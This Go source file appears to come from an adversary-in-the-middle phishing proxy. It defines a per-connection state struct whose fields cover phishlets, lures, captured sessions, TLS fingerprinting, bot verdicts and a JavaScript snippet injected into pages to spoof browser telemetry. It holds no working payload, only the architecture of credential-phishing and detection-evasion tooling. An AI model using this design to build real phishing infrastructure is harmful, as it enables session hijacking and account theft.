package aitm

import "net/http"

// ProxyContext is the per-connection state bag threaded through the request pipeline.
// Allocated once per connection; must not be shared across goroutines.
type ProxyContext struct {
	ClientIP         string
	JA4Hash          string
	ClientHelloBytes []byte // raw TLS ClientHello record, set before pipeline runs
	BotVerdict       BotVerdict
	Phishlet         *Phishlet
	Lure             *Lure
	Session          *Session
	IsNewSession     bool

	// ResponseWriter is set by the CONNECT handler so short-circuiting handlers
	// can write directly to the client without going upstream.
	ResponseWriter http.ResponseWriter

	// PuppetOverride is a JS snippet that overrides browser telemetry signals.
	// Set by PuppetOverrideResolver; injected by JSInjector before </head>.
	PuppetOverride string

	// RequestBody caches the request body after the first handler reads it,
	// so subsequent handlers don't re-read from the wire.
	RequestBody []byte

	// RequestID is a UUID assigned at connection time for log correlation.
	RequestID string
}
